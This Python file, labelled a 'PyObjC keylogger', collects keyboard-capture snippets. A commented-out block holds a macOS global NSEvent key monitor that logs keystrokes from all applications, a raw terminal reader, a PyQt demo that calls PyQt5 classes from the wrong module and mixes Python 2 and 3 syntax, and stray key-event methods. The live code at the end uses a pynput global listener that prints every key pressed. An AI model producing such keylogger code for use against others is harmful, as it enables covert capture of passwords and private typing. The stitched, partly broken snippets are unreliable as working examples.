#!/usr/bin/python2.6

"""PyObjC keylogger for Python
by  ljos https://github.com/ljos
"""
"""
from Cocoa import *
import time
from Foundation import *
from PyObjCTools import AppHelper

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, aNotification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSKeyDownMask, handler)

def handler(event):
    NSLog(u"%@", event)

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()
    print app
    

if __name__ == '__main__':
   main()

  

import termios, fcntl, sys, os

fd = sys.stdin.fileno()

oldterm = termios.tcgetattr(fd)
newattr = termios.tcgetattr(fd)
newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
termios.tcsetattr(fd, termios.TCSANOW, newattr)

oldflags = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)

try:
    while 1:
        try:
            c = sys.stdin.read(1)
            print "Got character", repr(c)
        except IOError: pass
finally:
    termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)
    fcntl.fcntl(fd, fcntl.F_SETFL, oldflags)
    
from PyQt5 import QtGui, QtCore

class Window(QtGui.QWidget):
    def __init__(self):
        QtGui.QWidget.__init__(self)
        self.button = QtGui.QPushButton('Test', self)
        self.button.clicked.connect(self.handleButton)
        layout = QtGui.QVBoxLayout(self)
        layout.addWidget(self.button)

    def handleButton(self):
        modifiers = QtGui.QApplication.keyboardModifiers()
        if modifiers == QtCore.Qt.ShiftModifier:
            print('Shift+Click')
        elif modifiers == QtCore.Qt.ControlModifier:
            print('Control+Click')
        elif modifiers == (QtCore.Qt.ControlModifier |
                           QtCore.Qt.ShiftModifier):
            print('Control+Shift+Click')
        else:
            print('Click')

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    window = Window()
    window.show()
    sys.exit(app.exec_())

def keyPressEvent(self, event):
    self.firstrelease = True
    astr = "pressed: " + str(event.key())
    self.keylist.append(astr)

def keyReleaseEvent(self, event):
    if self.firstrelease == True: 
        self.processmultikeys(self.keylist)

    self.firstrelease = False
    del self.keylist[-1]

def processmultikeys(self,keyspressed):
    # your logic here
    print keyspressed
"""

#THIS PERFECTLY WORKS FOR COMMAND AND OTHER KEYS

from pynput.keyboard import Key, Listener

def on_press(key):
    print('{0} pressed'.format(
        key))

def on_release(key):
    print('{0} release'.format(
        key))
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
